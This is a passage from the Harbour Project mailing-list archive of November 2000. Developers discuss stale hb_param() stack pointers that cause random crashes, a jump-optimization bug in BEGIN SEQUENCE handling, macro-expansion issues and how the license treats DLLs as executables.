 SomeOtherCall(pMyItem); /* could fail here because pMyItem */
...

Should be reWritted as ;

{
 PHB_ITEM pMyItem ;

 SomeCalltootherfunc(); /* wich could call StackPush() */

 pMyItem = hb_param(1) ;
 SomeOtherCall(pMyItem); /* will not fail anymore */
...

Same apply when directly using stack->pBase + nPos, we must 
avoid storing the pointer, and in place always use the stack-
>pbase + nPos (more easy to track and to understand :-) )


> As our FWH app grows, we get more and more weird random blow-ups.  The
> reported address is usually meaningless, and we can often get it to go
> away temporarily by adding more code or re-arranging the link script.
> Any ideas how to determine what is whacking memory?
> 
> Brian Hays
> Abacus Data Systems, Inc
> 
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Thu Nov 16 04:56:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Thu Nov 16 04:56:02 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <3A135B5C.4E0DCBF7@home.com>
Message-ID: <001901c04fb3$26c29300$0f2aa8c0@fivetechs>

Sid,

> we may have a problem with memory handling<i hope not>

I think so, too...

related to the stack, as we have seen these days ?
 

Antonio

From harbour@lists.harbour-project.org  Thu Nov 16 06:39:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Thu Nov 16 06:39:02 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
References: <3A115142.6634E63A@libero.it>
Message-ID: <3A13C858.9AED70F3@imid.med.pl>

Maurilio Longo wrote:

> I'm having problems with begin sequence / break code. It doesn't work as
> it should. Please test tests/begin.prg which now doesn't end anymore (I
> think it should end).

  There is a bug in NOOP code removing in harbour.c. If there is any
NOOP opcode
between HB_P_SEQBEGIN and HB_P_SEQEND then they are removed however the
jump offset stored with HB_P_SEQBEGIN is not updated. So instead jumping
to the beginning of HB_P_ENDSEQ we are jumping a few bytes after it
(depending of the number of noops removed). This can cause that random
pcode is 
executed (for example, in tests/begin.prg the pcode for array generation
is executed instead of HB_P_SEQEND) - this can also produce random GPFs
in some cases.
  Sorry, I am not familiar with jump optimization so I cannot fix it.

From harbour@lists.harbour-project.org  Thu Nov 16 07:40:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 16 07:40:03 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
References: <3A115142.6634E63A@libero.it> <3A13C858.9AED70F3@imid.med.pl>
Message-ID: <3A13D592.3AB729FE@libero.it>

Thanks Ryszard,

now, who wrote NOP removing code?

regards.

rglab ha scritto:
> 
> Maurilio Longo wrote:
> 
> > I'm having problems with begin sequence / break code. It doesn't work as
> > it should. Please test tests/begin.prg which now doesn't end anymore (I
> > think it should end).
> 
>   There is a bug in NOOP code removing in harbour.c. If there is any
> NOOP opcode
> between HB_P_SEQBEGIN and HB_P_SEQEND then they are removed however the
> jump offset stored with HB_P_SEQBEGIN is not updated. So instead jumping
> to the beginning of HB_P_ENDSEQ we are jumping a few bytes after it
> (depending of the number of noops removed). This can cause that random
> pcode is
> executed (for example, in tests/begin.prg the pcode for array generation
> is executed instead of HB_P_SEQEND) - this can also produce random GPFs
> in some cases.
>   Sorry, I am not familiar with jump optimization so I cannot fix it.
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 16 10:10:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 10:10:03 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
In-Reply-To: <3A13D592.3AB729FE@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOECJDHAA.ron@profit-master.com>

I wrote the NOOP optimization, I'll take a look later this evening.

Ron

> Thanks Ryszard,
>
> now, who wrote NOP removing code?
>
> regards.
>
> rglab ha scritto:
> >
> > Maurilio Longo wrote:
> >
> > > I'm having problems with begin sequence / break code. It
> doesn't work as
> > > it should. Please test tests/begin.prg which now doesn't end
> anymore (I
> > > think it should end).
> >
> >   There is a bug in NOOP code removing in harbour.c. If there is any
> > NOOP opcode
> > between HB_P_SEQBEGIN and HB_P_SEQEND then they are removed however the
> > jump offset stored with HB_P_SEQBEGIN is not updated. So instead jumping
> > to the beginning of HB_P_ENDSEQ we are jumping a few bytes after it
> > (depending of the number of noops removed). This can cause that random
> > pcode is
> > executed (for example, in tests/begin.prg the pcode for array generation
> > is executed instead of HB_P_SEQEND) - this can also produce random GPFs
> > in some cases.
> >   Sorry, I am not familiar with jump optimization so I cannot fix it.


From harbour@lists.harbour-project.org  Thu Nov 16 10:18:01 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Thu Nov 16 10:18:01 2000
Subject: [Fwd: [Harbour] Macro & Binding (Ryszard)]
Message-ID: <3A13FB8D.CE8D9DD8@imid.med.pl>

It seems that reply-to is not always correctly set. I am resending it to
the list.


Ron Pinkas wrote:

> Do you have any objection, that I'll post the Early/Late macro fix to Flex
> build of Harbour?

 I am busy with other tasks now so feel free to do it however I will
implement it in the way I have outlined previously as soon as I will
find some more free time.

> If you are OK with that, should I also standardize the _GET_(...) support,
> so both builds are fully functional, and Clipper compatible?

  What do you mean with 'standardization' ?
 
Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 16 10:23:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 10:23:01 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
In-Reply-To: <3A13D592.3AB729FE@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMECKDHAA.ron@profit-master.com>

Ryszard,

Then, there is no need to waste my time :-(

_GET_(...) in Flex build is not working correctly. I meant to borrow the
approach used in the SimpLex build.

Ron

> Ron Pinkas wrote:
>
>> Do you have any objection, that I'll post the Early/Late macro fix to
Flex
>> build of Harbour?
>
>  I am busy with other tasks now so feel free to do it however I will
> implement it in the way I have outlined previously as soon as I will
> find some more free time.
>
>> If you are OK with that, should I also standardize the _GET_(...)
support,
>> so both builds are fully functional, and Clipper compatible?
>
>  What do you mean with 'standardization' ?
>
> Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 16 10:23:15 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Thu Nov 16 10:23:15 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
References: <LOBBKAFMMFGJIKLMEPAKOECJDHAA.ron@profit-master.com>
Message-ID: <3A13FCF6.ABD9C23D@imid.med.pl>

Ron Pinkas wrote:
> 
> I wrote the NOOP optimization, I'll take a look later this evening.

  Look for 4-th sequence in tests/begin.prg. There is local variable
used inside for which PUSHLOCAL is replaced with PUSHLOCALSHORT that is
producing a noop pcode.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 16 11:04:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 11:04:01 2000
Subject: [Harbour] 2000-11-16 02:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A13FCF6.ABD9C23D@imid.med.pl>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEECLDHAA.ron@profit-master.com>

2000-11-16 02:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/compiler/harbour.c
     ! Fixed jump optimization for HB_P_SEQBEGIN and HB_P_SEQEND

From harbour@lists.harbour-project.org  Thu Nov 16 11:05:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 11:05:03 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
In-Reply-To: <3A13C858.9AED70F3@imid.med.pl>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIECLDHAA.ron@profit-master.com>

Fixed!

> Maurilio Longo wrote:
>
> > I'm having problems with begin sequence / break code. It doesn't work as
> > it should. Please test tests/begin.prg which now doesn't end anymore (I
> > think it should end).
>
>   There is a bug in NOOP code removing in harbour.c. If there is any
> NOOP opcode
> between HB_P_SEQBEGIN and HB_P_SEQEND then they are removed however the
> jump offset stored with HB_P_SEQBEGIN is not updated. So instead jumping
> to the beginning of HB_P_ENDSEQ we are jumping a few bytes after it
> (depending of the number of noops removed). This can cause that random
> pcode is
> executed (for example, in tests/begin.prg the pcode for array generation
> is executed instead of HB_P_SEQEND) - this can also produce random GPFs
> in some cases.
>   Sorry, I am not familiar with jump optimization so I cannot fix it.


From harbour@lists.harbour-project.org  Thu Nov 16 11:31:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 16 11:31:02 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
References: <LOBBKAFMMFGJIKLMEPAKIECLDHAA.ron@profit-master.com>
Message-ID: <3A140BAA.2597142@libero.it>

Thanks!!

Ron Pinkas ha scritto:
> 
> Fixed!
> 
> > Maurilio Longo wrote:
> >
> > > I'm having problems with begin sequence / break code. It doesn't work as
> > > it should. Please test tests/begin.prg which now doesn't end anymore (I
> > > think it should end).
> >
> >   There is a bug in NOOP code removing in harbour.c. If there is any
> > NOOP opcode
> > between HB_P_SEQBEGIN and HB_P_SEQEND then they are removed however the
> > jump offset stored with HB_P_SEQBEGIN is not updated. So instead jumping
> > to the beginning of HB_P_ENDSEQ we are jumping a few bytes after it
> > (depending of the number of noops removed). This can cause that random
> > pcode is
> > executed (for example, in tests/begin.prg the pcode for array generation
> > is executed instead of HB_P_SEQEND) - this can also produce random GPFs
> > in some cases.
> >   Sorry, I am not familiar with jump optimization so I cannot fix it.
> 

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 16 13:19:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 13:19:01 2000
Subject: [Fwd: [Harbour] Macro & Binding (Ryszard)]
In-Reply-To: <3A13FB8D.CE8D9DD8@imid.med.pl>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGECMDHAA.ron@profit-master.com>

Ryszard,

Let me just add, that the issue of early binding of complex macro (of
declared symbol) within a codeblock is not really a problem!

1. The current implementation in SimpLex build is 100% Clipper compatible.
2. The issue is limited to declared symbols.
3. When declared symbols are involved, most Clipper programmers, already
know how to address it, by simply building the block in increments:

   Instead of {|| &MyMacro + 1 ) we simply use &( "{|| " + MyMacro + " +
1}" )

In _all_ cases, one or *more* macros, will be replaced with only *one*
macro. I think the solution you suggested is too complex, expensive (new
PCODE and additional logic), slower, and is unnecessary. I will appreciate
it, if you consider my input, and address it _before_ implementing your
proposal.

Ron


> Ron Pinkas wrote:
>
> > Do you have any objection, that I'll post the Early/Late macro
> fix to Flex
> > build of Harbour?
>
>  I am busy with other tasks now so feel free to do it however I will
> implement it in the way I have outlined previously as soon as I will
> find some more free time.
>
> > If you are OK with that, should I also standardize the
> _GET_(...) support,
> > so both builds are fully functional, and Clipper compatible?
>
>   What do you mean with 'standardization' ?
>
> Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 16 13:21:03 2000
From: harbour@lists.harbour-project.org (Jacek Potempa)
Date: Thu Nov 16 13:21:03 2000
Subject: [Harbour] Harbour license
Message-ID: <NOEPIKLDCODGGHOPAHEEKELACCAA.Jacek.Potempa@otc.pl>

To all.

I need help in interpreting the following
fragment of the HARBOUR PROJECT LICENSE:


[...]
 The exception is that if you link the Harbour Runtime Library (HRL)
 and/or the Harbour Virtual Machine (HVM) with other files to produce
 an executable, this does not by itself cause the resulting executable
 to be covered by the GNU General Public License. Your use of that
 executable is in no way restricted on account of linking the HRL
 and/or HVM code into it.
[...]

The actual question is related to the interpretation of what the
"executable" is.

1) What if I link Harbour libraries into DLL? Is it an executable?
2) What if I link Harbour libraries into COM/DirectX object? Is it an
executable?

In today's world there are many cases, when it is difficult to distinguish
what is an executable, and what is not. Note that both DLLs and COM objects
may expose services which may be used without explicitly linking them
into another application. They may provide services in quite similar way as
"typical" DOS EXEs.

I think it would be a great waste of time and developer's effort,
if we limit Harbour usage to "typical" EXEs.

Any opinions?

Jacek Potempa
OTC S.A.
Jacek.Potempa@otc.pl
http://www.otc.pl/en


From harbour@lists.harbour-project.org  Thu Nov 16 15:29:01 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 16 15:29:01 2000
Subject: [Harbour] Harbour license
In-Reply-To: <200011161827.eAGIRbE13114@thor.parrett.net>
References: <NOEPIKLDCODGGHOPAHEEKELACCAA.Jacek.Potempa@otc.pl>
Message-ID: <200011162027.VAA19564@pegasus.wanadoo.be>

I agree with David's point of view.

> ** Reply to message from "Jacek Potempa" <Jacek.Potempa@otc.pl> on Thu, 16
> Nov 2000 19:15:57 +0100
> 
> > 1) What if I link Harbour libraries into DLL? Is it an executable?
> 
> Yes.
> 
> > 2) What if I link Harbour libraries into COM/DirectX object? Is it an
> > executable?
> 
> Yes.
> -- 


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 16 16:36:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Thu Nov 16 16:36:02 2000
Subject: [Harbour] Random gpfs
References: <3A13BCBA.27761.48CA20@localhost>
Message-ID: <001201c05015$13b295a0$8604d2cc@san.rr.com>

JF:
A quick scan of dbcmd.c shows hb_param was used throughout to assign
pointers directly into structures!!!
Also, the original authors may not be available to review it...

It doesn't sound feasible to expect all coders to be so aware of the stack
issues--the results of a mistake are too massive and hard to trace....

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
> One way to avoid that is to use hb_param() only when we absolutly
> need an Item pointer (Object or array for example) and only when
> we need it (ie: not when declaring the PHB_ITEM, but just before to
> use it to avoid storing a pointer wich could became invalid).
>
> The problem is that many 3rd party product could use hb_param()
> being certain the pointer will not move and then ...
>
> Perhaps we should have some reflexion here about this potential
> problem. Knowing the stack behaviour, I prefer to have a dynamic
> stack but then we have to clearly annouce this potential problem to
> any developer wich would like to reuse some clipper code.
>



From harbour@lists.harbour-project.org  Thu Nov 16 17:11:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Thu Nov 16 17:11:02 2000
Subject: [Harbour] select() buglet
Message-ID: <007601c05019$fa00e120$8604d2cc@san.rr.com>

Clipper accepts a space-padded string for select(), but Harbour does not and
returns 0.

Is anyone else actvely working on the RDD now, or should I hunt this one
down?

Brian


From harbour@lists.harbour-project.org  Thu Nov 16 17:39:01 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 16 17:39:01 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <001201c05015$13b295a0$8604d2cc@san.rr.com>
Message-ID: <200011162238.XAA01487@pegasus.wanadoo.be>

Hi Brian

> A quick scan of dbcmd.c shows hb_param was used throughout to assign
> pointers directly into structures!!!

Humm, have to read it to be sure I understand what you mean...

> Also, the original authors may not be available to review it...
> 
> It doesn't sound feasible to expect all coders to be so aware of the stack
> issues--the results of a mistake are too massive and hard to trace....

Yes, I'm sure we will expect many more GPF :-((((

This is why I was saying we should think about this problem ...
 
> Brian Hays
> Abacus Data Systems, Inc
> 
> ----- Original Message -----
> > One way to avoid that is to use hb_param() only when we absolutly
> > need an Item pointer (Object or array for example) and only when
> > we need it (ie: not when declaring the PHB_ITEM, but just before to use
> > it to avoid storing a pointer wich could became invalid).
> >
> > The problem is that many 3rd party product could use hb_param()
> > being certain the pointer will not move and then ...
> >
> > Perhaps we should have some reflexion here about this potential
> > problem. Knowing the stack behaviour, I prefer to have a dynamic
> > stack but then we have to clearly annouce this potential problem to any
> > developer wich would like to reuse some clipper code.
> >
> 
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 16 17:49:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 16 17:49:02 2000
Subject: [Harbour] -fbounds-checking fails inside a piece of bison
Message-ID: <3A146422.463C1630@libero.it>

Hi,

I decided to try to compile everything with bounds checking on (is there
such a possiblity under win32?) but the first thing to fail is
harbour.exe as soon as it tries to compile first .prg file inside /rtl.

Is there a bug we need to fix inside bison?

regards.


../../../../source/compiler/os2/gcc/harbour.exe ../../achoice.prg  -n
-q0 -w -es2 -gc0 -I.
./../ -I../../../../include
Bounds Checking GCC v 2.8.1-1.01 Copyright (C) 1995 Richard W.M. Jones
Bounds Checking comes with ABSOLUTELY NO WARRANTY. For details see file
`COPYING' that should have come with the source to this program.
Bounds Checking is free software, and you are welcome to redistribute it
under certain conditions. See the file `COPYING' for details.
For more information, set GCC_BOUNDS_OPTS to `-help'
/emx/share/bison.simple:317:Bounds error: NULL or ILLEGAL pointer used
in pointer preincre
ment (++p).
/emx/share/bison.simple:317:  Pointer value: ILLEGAL

Abnormal program termination
core dumped
make[3]: *** [achoice.c] Error 3
make[3]: Leaving directory `/repository/harbour/source/rtl/os2/gcc'
make[2]: *** [descend] Error 2
make[2]: Leaving directory `/repository/harbour/source/rtl'

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 16 18:12:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 16 18:12:02 2000
Subject: [Harbour] Harbour license
Message-ID: <200011161811_MC2-BB2B-AC4C@compuserve.com>

Jacek,

I'd say your examples of files are executables.

However, things like LIB and OBJ files arguably are not.  But they
should (probably :-) be included.

Unfortunately, the term "binary" is probably not good enough instead
of "executable" because binary would probably include something such
as a ZIP of all the sources. :-(

Maybe we could use "compiled file"?  Or "Harbour compiler output
file"?  Those look OK from a 3P point of view (I hope).

John.

From harbour@lists.harbour-project.org  Thu Nov 16 19:22:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Thu Nov 16 19:22:02 2000
Subject: [Harbour] bug in macro expander
Message-ID: <000b01c0502c$4df61590$8604d2cc@san.rr.com>

Ryszard and Ron:

I'm getting this error on my lookup() function while
macro-expanding one of my user-defined setups:

   Error: Undefined function
   Operation: LOOKUP
   Error log saved to hberror.log file

The function is valid and linked in. Here's the tracelog
I put in front of the exploding line, including a
call to exactly what's in the string that's being expanded:

tracelog(,cStr,               // 'lookup("WHO", Attorney)'
   select(),                  // 3, correct workarea
   fieldpos("attorney"),      // 3, the correct pos of the Attorney field
   lookup("WHO", Attorney))   // hard-coded same call being expanded

Here's the results of the trace. All values are correct:
[MEGAFORM] (  541) Called from:
>>>NIL<<<
>>>lookup("WHO", Attorney)<<<
>>>3<<<
>>>3<<<
>>>All People<<<     // results of hard-coded call to lookup()

Here's the offending line:
   cType := (nAlias)->(valtype(&(cStr)))

What's interesting is that a previous call to another function
goes through without an error:
   "Age(Opened)"
...also has a field reference (Opened).  The only difference is
it has 1 parameter whereas the lookup call has both a string and
a field reference.

Any help on this one will be greatly appreciated!

Brian Hays
Abacus Data Systems, Inc

P.S. FWIW, This blows with Flex or Simplex.



From harbour@lists.harbour-project.org  Thu Nov 16 19:25:04 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Thu Nov 16 19:25:04 2000
Subject: [Harbour] Random gpfs
References: <200011162238.XAA01487@pegasus.wanadoo.be>
Message-ID: <001301c0502c$bdd240f0$8604d2cc@san.rr.com>

> > A quick scan of dbcmd.c shows hb_param was used throughout to assign
> > pointers directly into structures!!!
> 
> Humm, have to read it to be sure I understand what you mean...

For example:
      pEvalInfo.itmBlock = hb_param( 1, HB_IT_BLOCK );

and then pEvalInfo is passed around to other functions...

Brian


From harbour@lists.harbour-project.org  Thu Nov 16 19:30:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 19:30:03 2000
Subject: [Harbour] Harbour license
In-Reply-To: <20001116234650.G18577@hagbard.davep.org>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKECODHAA.ron@profit-master.com>

John,

OBJs and LIBs of Harbour compiled code, are NOT subject to any Harbour
related restriction, as they do NOT include any Harbour License protected
code.

Simply put, the compiled code resulting from a PRG written by the END-USER,
is NOT subject to any restriction controlled by the Harbour License
Agreement.

The only time such compiled code falls into the gray area, covered by the
Harbour License Agreement, is when such code is LINKED with Harbour RTL, or
HVM. Thus the exception, to clarify that even such LINK is not subjecting
the resulting executable (in what ever form) to any restrictions related to
the Harbour License Agreement.

Ron

> On Thu, Nov 16, 2000 at 06:11:29PM -0500, John Skelton wrote:
>
> > However, things like LIB and OBJ files arguably are not. But they should
> > (probably :-) be included.
>
> I'd say that they are examples of things that should *not* be included. If
> someone wishes to distribute the HRL as a binary they should observe the
> GPL. Actually, likewise if they seek to distribute it as a DLL in any
> modified form.
>
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/


From harbour@lists.harbour-project.org  Thu Nov 16 19:50:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 16 19:50:04 2000
Subject: [Harbour] bug in macro expander
In-Reply-To: <000b01c0502c$4df61590$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com>

Brian,

I'm not able to replicate your problem!

Here is my sample program which works correctly:

// --------- test.prg ---------- //
Procedure Main

  LOCAL cMacro := "MyFun( 'Hello', LAST )"

  USE TEST

  FOR Counter := 1 TO 100
     ? ValType( &cMacro )
  NEXT

RETURN

FUNCTION MyFun( cMsg, cField )

RETURN cMsg + cField
// --------- EOF test.prg ---------- //

Ron

> Ryszard and Ron:
> 
> I'm getting this error on my lookup() function while
> macro-expanding one of my user-defined setups:
> 
>    Error: Undefined function
>    Operation: LOOKUP
>    Error log saved to hberror.log file
> 
> The function is valid and linked in. Here's the tracelog
> I put in front of the exploding line, including a
> call to exactly what's in the string that's being expanded:
> 
> tracelog(,cStr,               // 'lookup("WHO", Attorney)'
>    select(),                  // 3, correct workarea
>    fieldpos("attorney"),      // 3, the correct pos of the Attorney field
>    lookup("WHO", Attorney))   // hard-coded same call being expanded
> 
> Here's the results of the trace. All values are correct:
> [MEGAFORM] (  541) Called from:
> >>>NIL<<<
> >>>lookup("WHO", Attorney)<<<
> >>>3<<<
> >>>3<<<
> >>>All People<<<     // results of hard-coded call to lookup()
> 
> Here's the offending line:
>    cType := (nAlias)->(valtype(&(cStr)))
> 
> What's interesting is that a previous call to another function
> goes through without an error:
>    "Age(Opened)"
> ...also has a field reference (Opened).  The only difference is
> it has 1 parameter whereas the lookup call has both a string and
> a field reference.
> 
> Any help on this one will be greatly appreciated!
> 
> Brian Hays
> Abacus Data Systems, Inc
> 
> P.S. FWIW, This blows with Flex or Simplex.


From harbour@lists.harbour-project.org  Fri Nov 17 01:24:02 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Fri Nov 17 01:24:02 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <001301c0502c$bdd240f0$8604d2cc@san.rr.com>
Message-ID: <200011170623.HAA22269@pegasus.wanadoo.be>

Hi Brian,

> > > A quick scan of dbcmd.c shows hb_param was used throughout to assign
> > > pointers directly into structures!!!
> > 
> > Humm, have to read it to be sure I understand what you mean...
> 
> For example:
>       pEvalInfo.itmBlock = hb_param( 1, HB_IT_BLOCK );
> 
> and then pEvalInfo is passed around to other functions...

Yes, clearly risky, depending on the life time of the pEvalinfo 
structure.

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Fri Nov 17 02:58:02 2000
From: harbour@lists.harbour-project.org (YALTA SEA PORT)
Date: Fri Nov 17 02:58:02 2000
Subject: [Harbour] Please HELP to get the HARBOUR's Binaries & Libs
Message-ID: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com>

This is a multi-part message in MIME format.

------=_NextPart_000_0004_01C0507B.EE794BA0
Content-Type: text/plain;
	charset="windows-1251"
Content-Transfer-Encoding: quoted-printable

Dear Sirs,

I'm older, registered CLIPPERist.
I cannot download Libs & binaries for testing ones due low traffic speed
(150..250 bps!).
Please HELP me to get the Harbour binaries, libs and docs.

Yours faithfully,

Alexander Butakov
Yalta, Crimea, Ukraine.
E-mail: yasco@mail.ylt.crimea.com


------=_NextPart_000_0004_01C0507B.EE794BA0
Content-Type: text/html;
	charset="windows-1251"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD W3 HTML//EN">
<HTML>
<HEAD>

<META content=3D"text/html; charset=3Dwindows-1251" =
http-equiv=3DContent-Type>
<META content=3D'"MSHTML 4.72.3110.7"' name=3DGENERATOR>
</HEAD>
<BODY>
<DIV><FONT face=3D"Courier New" size=3D2>Dear Sirs,</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2></FONT>&nbsp;</DIV>
<DIV><FONT face=3D"Courier New" size=3D2>I'm older, registered=20
CLIPPERist.</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2>I cannot download Libs &amp; =
binaries for=20
testing ones due low traffic speed</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2>(150..250 bps!).</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2>Please HELP me to get the =
Harbour binaries,=20
libs and docs.</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2></FONT>&nbsp;</DIV>
<DIV><FONT face=3D"Courier New" size=3D2>Yours faithfully,</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2></FONT>&nbsp;</DIV>
<DIV><FONT face=3D"Courier New" size=3D2>Alexander Butakov</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2>Yalta, Crimea, =
Ukraine.</FONT></DIV>
<DIV><FONT face=3D"Courier New" size=3D2>E-mail: <A=20
href=3D"mailto:yasco@mail.ylt.crimea.com">yasco@mail.ylt.crimea.com</A></=
FONT></DIV>
<DIV><FONT face=3D"Courier New" =
size=3D2></FONT>&nbsp;</DIV></BODY></HTML>

------=_NextPart_000_0004_01C0507B.EE794BA0--


From harbour@lists.harbour-project.org  Fri Nov 17 03:21:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 17 03:21:02 2000
Subject: [Harbour] debugger
In-Reply-To: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com>
Message-ID: <000001c0506f$084c8b80$0f2aa8c0@fivetechs>

TGet must be changed into Get inside debugger.prg in order to make it work.

Anyhow, keyboard is no longer working on it...

Could someone please confirm this ? Thanks!

Antonio


From harbour@lists.harbour-project.org  Fri Nov 17 03:23:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 17 03:23:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com>
Message-ID: <000101c0506f$60a08b60$0f2aa8c0@fivetechs>

Could we change hb_param() to return an index (the parameter index on to the
stack) instead of returning an address ?

What side effects could we get ?

That could save many GPFs...

Antonio


From harbour@lists.harbour-project.org  Fri Nov 17 03:33:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Fri Nov 17 03:33:02 2000
Subject: [Harbour] bug in macro expander
References: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com>
Message-ID: <004e01c05070$d13fea40$8604d2cc@san.rr.com>

Ron:
You're right, I can't duplicate it with a small test either.
But how is it possible that a function that has just been called
successfully is suddenly an "Undefined function" in the macro expander????

It turns out that it is THAT FUNCTION (LOOKUP) that cannot be referenced in
macro expansion. I can call the function normally, but inside a macro it
becomes Undefined.  I've tried using it in macros and &() compilations, and
it always fails. If I change the name, then it works!?!?  Macrol.c and
harbourl.c  have some sort of macro/identifier called LOOKUP.  Is it
possible some circumstances cause LOOKUP to not be valid within the macro
expander?

Perhaps it's related to the symbol table issue JF mentioned yesterday.
Is it possible that the symbol table is becoming corrupted when an app grows
and a lot of macro expansion occurs?
Yikes!!
If anyone has any suggestions as to how I can go about debugging this kind
of thing, I'll do whatever it takes.


Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: "Ron Pinkas" <ron@profit-master.com>
To: <harbour@lists.harbour-project.org>
Sent: Thursday, November 16, 2000 4:51 pm
Subject: RE: [Harbour] bug in macro expander


> Brian,
>
> I'm not able to replicate your problem!
>
> Here is my sample program which works correctly:
>
> // --------- test.prg ---------- //
> Procedure Main
>
>   LOCAL cMacro := "MyFun( 'Hello', LAST )"
>
>   USE TEST
>
>   FOR Counter := 1 TO 100
>      ? ValType( &cMacro )
>   NEXT
>
> RETURN
>
> FUNCTION MyFun( cMsg, cField )
>
> RETURN cMsg + cField
> // --------- EOF test.prg ---------- //
>
> Ron
>
> > Ryszard and Ron:
> >
> > I'm getting this error on my lookup() function while
> > macro-expanding one of my user-defined setups:
> >
> >    Error: Undefined function
> >    Operation: LOOKUP
> >    Error log saved to hberror.log file
> >
> > The function is valid and linked in. Here's the tracelog
> > I put in front of the exploding line, including a
> > call to exactly what's in the string that's being expanded:
> >
